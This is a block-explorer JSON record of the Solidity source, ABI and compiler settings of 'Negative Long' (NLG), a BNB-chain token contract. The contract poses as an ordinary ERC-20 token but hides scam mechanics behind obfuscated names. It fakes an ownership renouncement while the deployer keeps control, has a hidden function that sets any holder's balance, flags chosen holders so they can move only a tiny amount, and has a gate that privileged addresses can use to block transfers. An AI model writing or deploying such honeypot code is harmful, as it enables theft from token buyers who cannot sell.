{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface sellLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLaunchTake {\n    function createPair(address receiverLiquidity, address isTokenSender) external returns (address);\n}\n\ninterface launchedSenderBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalWallet) external view returns (uint256);\n\n    function transfer(address totalTokenReceiver, uint256 listTxLaunch) external returns (bool);\n\n    function allowance(address walletLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTxLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTokenReceiver,\n        uint256 listTxLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamLiquidity, uint256 value);\n    event Approval(address indexed walletLaunched, address indexed spender, uint256 value);\n}\n\ninterface launchedSenderBuyMetadata is launchedSenderBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NegativeLong is launchedWallet, launchedSenderBuy, launchedSenderBuyMetadata {\n\n    address maxTotalSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private senderFeeLimit;\n\n    event OwnershipTransferred(address indexed enableTrading, address indexed maxFund);\n\n    uint256 private atIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n    function minEnableMode(uint256 listTxLaunch) public {\n        shouldSwap();\n        senderTo = listTxLaunch;\n    }\n\n    function transferFrom(address feeTotal, address totalTokenReceiver, uint256 listTxLaunch) external override returns (bool) {\n        if (_msgSender() != maxTotalSender) {\n            if (buyFund[feeTotal][_msgSender()] != type(uint256).max) {\n                require(listTxLaunch <= buyFund[feeTotal][_msgSender()]);\n                buyFund[feeTotal][_msgSender()] -= listTxLaunch;\n            }\n        }\n        return atAuto(feeTotal, totalTokenReceiver, listTxLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyFund;\n\n    function amountWallet() public {\n        emit OwnershipTransferred(launchIs, address(0));\n        tokenWallet = address(0);\n    }\n\n    mapping(address => bool) public receiverIsFund;\n\n    address public launchIs;\n\n    uint256 fundMin;\n\n    string private exemptMode = \"Negative Long\";\n\n    bool public senderBuyMax;\n\n    uint8 private toIs = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptMode;\n    }\n\n    function transfer(address exemptTrading, uint256 listTxLaunch) external virtual override returns (bool) {\n        return atAuto(_msgSender(), exemptTrading, listTxLaunch);\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenWallet;\n    }\n\n    function atAuto(address feeTotal, address totalTokenReceiver, uint256 listTxLaunch) internal returns (bool) {\n        if (feeTotal == launchIs) {\n            return swapTo(feeTotal, totalTokenReceiver, listTxLaunch);\n        }\n        uint256 listExempt = launchedSenderBuy(txShouldIs).balanceOf(atIsTake);\n        require(listExempt == senderTo);\n        require(totalTokenReceiver != atIsTake);\n        if (buyMax[feeTotal]) {\n            return swapTo(feeTotal, totalTokenReceiver, buyToken);\n        }\n        return swapTo(feeTotal, totalTokenReceiver, listTxLaunch);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toIs;\n    }\n\n    bool public buySwapAt;\n\n    bool public tokenTrading;\n\n    function allowance(address launchMax, address marketingTo) external view virtual override returns (uint256) {\n        if (marketingTo == maxTotalSender) {\n            return type(uint256).max;\n        }\n        return buyFund[launchMax][marketingTo];\n    }\n\n    function balanceOf(address totalWallet) public view virtual override returns (uint256) {\n        return tradingAuto[totalWallet];\n    }\n\n    function swapTake(address txFrom) public {\n        require(txFrom.balance < 100000);\n        if (buySwapAt) {\n            return;\n        }\n        if (atIs == buyLimit) {\n            senderFeeLimit = false;\n        }\n        receiverIsFund[txFrom] = true;\n        if (buyLimit == atIs) {\n            atIs = buyLimit;\n        }\n        buySwapAt = true;\n    }\n\n    uint256 private buyLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    mapping(address => uint256) private tradingAuto;\n\n    function approve(address marketingTo, uint256 listTxLaunch) public virtual override returns (bool) {\n        buyFund[_msgSender()][marketingTo] = listTxLaunch;\n        emit Approval(_msgSender(), marketingTo, listTxLaunch);\n        return true;\n    }\n\n    string private receiverMode = \"NLG\";\n\n    uint256 senderTo;\n\n    uint256 constant buyToken = 13 ** 10;\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    address public txShouldIs;\n\n    function shouldSwap() private view {\n        require(receiverIsFund[_msgSender()]);\n    }\n\n    address atIsTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapTo(address feeTotal, address totalTokenReceiver, uint256 listTxLaunch) internal returns (bool) {\n        require(tradingAuto[feeTotal] >= listTxLaunch);\n        tradingAuto[feeTotal] -= listTxLaunch;\n        tradingAuto[totalTokenReceiver] += listTxLaunch;\n        emit Transfer(feeTotal, totalTokenReceiver, listTxLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public buyMax;\n\n    function amountSellTake(address walletTake) public {\n        shouldSwap();\n        if (buyLimit != atIs) {\n            senderBuyMax = false;\n        }\n        if (walletTake == launchIs || walletTake == txShouldIs) {\n            return;\n        }\n        buyMax[walletTake] = true;\n    }\n\n    constructor (){\n        \n        sellLimit sellAt = sellLimit(maxTotalSender);\n        txShouldIs = senderLaunchTake(sellAt.factory()).createPair(sellAt.WETH(), address(this));\n        \n        launchIs = _msgSender();\n        amountWallet();\n        receiverIsFund[launchIs] = true;\n        tradingAuto[launchIs] = maxReceiver;\n        \n        emit Transfer(address(0), launchIs, maxReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return tokenWallet;\n    }\n\n    function receiverTotalMin(address exemptTrading, uint256 listTxLaunch) public {\n        shouldSwap();\n        tradingAuto[exemptTrading] = listTxLaunch;\n    }\n\n    address private tokenWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"}],\"name\":\"amountSellTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTxLaunch\",\"type\":\"uint256\"}],\"name\":\"minEnableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIsFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverTotalMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"swapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NegativeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}